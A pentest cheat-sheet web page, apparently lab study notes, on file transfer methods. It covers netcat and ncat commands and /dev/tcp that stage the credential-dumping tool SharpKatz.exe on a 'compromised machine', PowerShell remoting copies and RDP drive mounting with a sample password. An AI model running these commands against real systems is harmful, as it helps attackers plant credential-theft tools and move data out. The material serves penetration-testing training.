@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Pentest CheatSheet | Pentest CheatSheet</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Pentest CheatSheet" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Pentest CheatSheet" />
+<meta property="og:description" content="Pentest CheatSheet" />
+<link rel="canonical" href="http://localhost:4000/zNew/TransferFiles/Miscellaneous.html" />
+<meta property="og:url" content="http://localhost:4000/zNew/TransferFiles/Miscellaneous.html" />
+<meta property="og:site_name" content="Pentest CheatSheet" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Pentest CheatSheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/TransferFiles/Miscellaneous.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Pentest CheatSheet</h1>
+        </a>
+        <h2>Pentest CheatSheet</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="miscellaneous-file-transfer-methods">Miscellaneous File Transfer Methods</h1>
+<h2 id="file-transfer-with-netcat-and-ncat">File Transfer with Netcat and Ncat</h2>
+<p><strong>NetCat - Target Machine - Listening on Port 8000</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-l</span> <span class="nt">-p</span> 8000 <span class="o">&gt;</span> SharpKatz.exe
+</code></pre></div></div>
+
+<p><strong>Ncat - Target Machine - Listening on Port 8000</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="c"># Example using Ncat</span>
+<span class="nv">$ </span>ncat <span class="nt">-l</span> <span class="nt">-p</span> 8000 <span class="nt">--recv-only</span> <span class="o">&gt;</span> SharpKatz.exe
+</code></pre></div></div>
+
+<p><strong>Netcat - Attack Host - Sending File to Compromised machine</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget <span class="nt">-q</span> https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+
+<span class="nv">$ </span>nc <span class="nt">-q</span> 0 192.168.49.128 8000 &lt; SharpKatz.exe
+</code></pre></div></div>
+
+<p><strong>Ncat - Attack Host - Sending File to Compromised machine</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget <span class="nt">-q</span> https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+
+<span class="nv">$ </span>ncat <span class="nt">--send-only</span> 192.168.49.128 8000 &lt; SharpKatz.exe
+</code></pre></div></div>
+
+<p><strong>Attack Host - Sending File as Input to Netcat</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-l</span> <span class="nt">-p</span> 443 <span class="nt">-q</span> 0 &lt; SharpKatz.exe
+</code></pre></div></div>
+
+<p><strong>Compromised Machine Connect to Netcat to Receive the File</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc 192.168.49.128 443 <span class="o">&gt;</span> SharpKatz.exe
+</code></pre></div></div>
+
+<p><strong>Attack Host - Sending File as Input to Ncat</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>ncat <span class="nt">-l</span> <span class="nt">-p</span> 443 <span class="nt">--send-only</span> &lt; SharpKatz.exe
+</code></pre></div></div>
+
+<p><strong>Target Machine Connect to Ncat to Receive the File</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ncat 192.168.49.128 443 <span class="nt">--recv-only</span> <span class="o">&gt;</span> SharpKatz.exe
+</code></pre></div></div>
+
+<p><strong>NetCat - Sending File as Input to Netcat</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-l</span> <span class="nt">-p</span> 443 <span class="nt">-q</span> 0 &lt; SharpKatz.exe
+</code></pre></div></div>
+
+<p><strong>Ncat - Sending File as Input to Netcat</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>ncat <span class="nt">-l</span> <span class="nt">-p</span> 443 <span class="nt">--send-only</span> &lt; SharpKatz.exe
+</code></pre></div></div>
+
+<p><strong>Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> &lt; /dev/tcp/192.168.49.128/443 <span class="o">&gt;</span> SharpKatz.exe
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Note: The same operation can be used to transfer files from the compromised host to our Pwnbox.</code></p>
+
+<h2 id="powershell-session-file-transfer">PowerShell Session File Transfer</h2>
+<p><strong>From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> Test-NetConnection <span class="nt">-ComputerName</span> DATABASE01 <span class="nt">-Port</span> 5985
+
+ComputerName     : DATABASE01
+RemoteAddress    : 192.168.1.101
+RemotePort       : 5985
+InterfaceAlias   : Ethernet0
+SourceAddress    : 192.168.1.100
+TcpTestSucceeded : True
+</code></pre></div></div>
+
+<p><strong>Create a PowerShell Remoting Session to DATABASE01</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nv">$Session</span> <span class="o">=</span> New-PSSession <span class="nt">-ComputerName</span> DATABASE01
+</code></pre></div></div>
+
+<p><strong>Copy samplefile.txt from our Localhost to the DATABASE01 Session</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> Copy-Item <span class="nt">-Path</span> C:<span class="se">\s</span>amplefile.txt <span class="nt">-ToSession</span> <span class="nv">$Session</span> <span class="nt">-Destination</span> C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\</span>
+</code></pre></div></div>
+
+<p><strong>Copy DATABASE.txt from DATABASE01 Session to our Localhost</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> Copy-Item <span class="nt">-Path</span> <span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\A</span><span class="s2">dministrator</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\D</span><span class="s2">ATABASE.txt"</span> <span class="nt">-Destination</span> C:<span class="se">\ </span><span class="nt">-FromSession</span> <span class="nv">$Session</span>
+</code></pre></div></div>
+
+<h2 id="rdp">RDP</h2>
+<p><strong>Mounting a Linux Folder Using rdesktop</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rdesktop 10.10.10.132 <span class="nt">-d</span> HTB <span class="nt">-u</span> administrator <span class="nt">-p</span> <span class="s1">'Password0@'</span> <span class="nt">-r</span> disk:linux<span class="o">=</span><span class="s1">'/home/user/rdesktop/files'</span>
+</code></pre></div></div>
+
+<p><strong>Mounting a Linux Folder Using xfreerdp</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:<span class="s1">'Password0@'</span> /drive:linux,/home/plaintext/htb/academy/filetransfer
+</code></pre></div></div>
+
+<p>To access the directory, we can connect to \tsclient\, allowing us to transfer files to and from the RDP session.</p>
+
+<p>Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.</p>
+
+<p>After selecting the drive, we can interact with it in the remote session that follows.</p>
+
+<p>`Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.</p>
+
+      </section>
+    </div>
+  </body>
+</html>
